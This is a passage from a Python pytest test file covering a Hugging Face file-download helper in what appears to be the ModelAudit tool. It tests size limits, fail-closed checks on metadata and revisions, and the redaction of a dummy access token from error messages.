        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Direct file downloads should allow files exactly at the capped boundary."""
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"x" * 1024)
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha="abc123")
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=1024)]

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/model.bin",
            max_size=1024,
        )

        mock_hf_api.return_value.repo_info.assert_called_once_with("test/model", revision="main")
        mock_hf_api.return_value.get_paths_info.assert_called_once_with("test/model", "model.bin", revision="abc123")
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model.bin",
            revision="abc123",
            cache_dir=None,
        )
        assert result == downloaded_file

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_oversized_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Oversized direct files should not reach hf_hub_download."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha="abc123")
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=11 * 1024 * 1024)]

        with pytest.raises(Exception, match="exceeds maximum allowed size") as exc_info:
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        assert "11.0 MB" in str(exc_info.value)
        assert "10.0 MB" in str(exc_info.value)
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    @pytest.mark.parametrize("file_size", [None, -1, "1024", True])
    def test_download_file_with_max_size_rejects_invalid_size_before_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        file_size: object,
    ) -> None:
        """Capped direct files fail closed when HuggingFace metadata has no valid size."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha="abc123")
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=file_size)]

        with pytest.raises(Exception, match="Unable to determine file size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_underreported_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped direct files should verify the returned cache file before scanning."""
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"oversized")
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha="abc123")
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=4)]

        with pytest.raises(Exception, match=r"Downloaded file size .* exceeds maximum allowed size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=4,
            )

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_unverifiable_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped direct files fail closed if the downloaded cache path cannot be verified."""
        mock_hf_hub_download.return_value = str(tmp_path / "missing.bin")
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha="abc123")
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(size=4)]

        with pytest.raises(Exception, match="Unable to verify downloaded file size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=4,
            )

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_redacts_metadata_errors(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Metadata preflight errors should not expose direct URL credentials."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha="abc123")
        mock_hf_api.return_value.get_paths_info.side_effect = Exception(
            "HEAD failed for https://huggingface.co/test/model/resolve/main/model.bin?token=hf_secret"
        )

        with pytest.raises(Exception, match="Failed to download file from") as exc_info:
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin?token=hf_secret",
                max_size=10 * 1024 * 1024,
            )

        error = str(exc_info.value)
        assert "hf_secret" not in error
        assert "token=" not in error
        assert "https://huggingface.co/test/model/resolve/main/model.bin" in error
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_missing_immutable_revision(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Capped downloads fail closed instead of sizing and fetching a mutable branch."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=None)

        with pytest.raises(Exception, match="Unable to determine immutable revision"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        mock_hf_api.return_value.get_paths_info.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_without_max_size_skips_metadata_preflight(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Uncapped direct file downloads keep existing behavior and skip metadata lookup."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        result = download_file_from_hf("https://huggingface.co/test/model/resolve/main/model.bin")

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_called_once()
        assert result == Path(mock_path)

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_zero_max_size_skips_metadata_preflight(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A zero maximum size should preserve ModelAudit's unlimited-size behavior."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/model.bin",
            max_size=0,
        )

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_called_once()
        assert result == Path(mock_path)

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_negative_max_size_rejected(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Negative direct-download limits should not silently disable enforcement."""
        with pytest.raises(Exception, match="Maximum file size must be non-negative"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=-1,
            )

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_failure(self, mock_hf_hub_download):
        """Test that file download failures are handled properly."""
        mock_hf_hub_download.side_effect = Exception(
            "Download failed for https://huggingface.co/test/model/resolve/main/file.bin?token=hf_secret"
        )

        url = "https://huggingface.co/test/model/resolve/main/file.bin?token=hf_secret"
        with pytest.raises(Exception, match="Failed to download file from") as exc_info:
            download_file_from_hf(url)

        error = str(exc_info.value)
        assert "hf_secret" not in error
        assert "token=" not in error
        assert "https://huggingface.co/test/model/resolve/main/file.bin" in error

    def test_download_file_invalid_url(self):
        """Test that invalid file URLs raise appropriate errors."""
        with pytest.raises(ValueError):
            download_file_from_hf("https://github.com/user/repo/blob/main/file.bin")

    def test_download_file_missing_dependency(self):
        """Test error when huggingface-hub is not installed."""
        real_import = __import__
        with patch("builtins.__import__") as mock_import:

            def side_effect(name, *args, **kwargs):
                if name == "huggingface_hub":
                    raise ImportError("No module named 'huggingface_hub'")
                return real_import(name, *args, **kwargs)

            mock_import.side_effect = side_effect
            with pytest.raises(ImportError, match="huggingface-hub package is required"):
                download_file_from_hf("https://huggingface.co/test/model/resolve/main/file.bin")
